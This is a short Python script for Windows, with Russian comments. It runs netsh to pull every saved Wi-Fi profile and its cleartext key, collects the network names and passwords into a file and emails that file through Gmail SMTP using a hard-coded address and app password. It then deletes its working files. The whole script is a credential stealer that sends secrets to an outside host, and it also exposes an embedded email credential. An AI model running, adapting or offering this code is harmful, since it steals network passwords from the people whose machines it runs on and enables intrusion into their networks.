#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import os
import imghdr
from email.message import EmailMessage
import smtplib


with open('Output.txt', 'w') as file:
    subprocess.run('netsh wlan show profiles', stdout=file, check=True)

with open('Output.txt', encoding = 'cp866') as file:
    lines = file.readlines()
    with open('SSID.txt', 'a') as f:
        for line in lines:
            if 'Все профили пользователей' in line:
                f.write(line)
            else:
                pass
with open('SSID.txt') as file:
    lines = file.readlines()
    for line in lines:
        line = line.split()
        # print(f'netsh wlan show profile name={line[-1]} key=clear')
        with open('BAD_Wifi.txt', 'a') as f:
            try:
                subprocess.run(f'netsh wlan show profile name={line[-1]} key=clear', stdout=f, check=True)
            except:
                pass

with open('BAD_Wifi.txt', encoding = 'cp866') as file:
    lines = file.readlines()
    with open('WIFI_Passwords.txt', 'a') as f:
        for line in lines:
            if 'Имя SSID               :' in line:
                f.write(line)
            if 'Содержимое ключа            :' in line:
                f.write(line.replace('     :', ':') + '\n')

os.system('del Output.txt')
os.system('del SSID.txt')
os.system('del BAD_Wifi.txt')

# ФУНКЦИЯ ОТПРАВКИ ПИСЬМА
def send_mail():
    EMAIL_ADRESS = 'asmodeuspython@gmail.com'     # без @gmail.com
    EMAIL_PASSWORD = 'hjvgaezwgldqbflk'
    EMAIL_RESIVER = 'asmodeuspython@gmail.com'  # можно самому себе

    msg = EmailMessage()
    msg['Subject'] = '=== WIFI_Passwords ==='
    msg['From'] = EMAIL_ADRESS
    msg['To'] = EMAIL_RESIVER
    

    file = 'WIFI_Passwords.txt'

    with open(file, 'rb') as f:
        file_data = f.read()
        file_type = imghdr.what(f.name)
        file_name = f.name
    msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(EMAIL_ADRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)

try:
    send_mail()
    time.sleep(1000)
    os.system(f'del WIFI_Passwords.txt')
except:
    pass

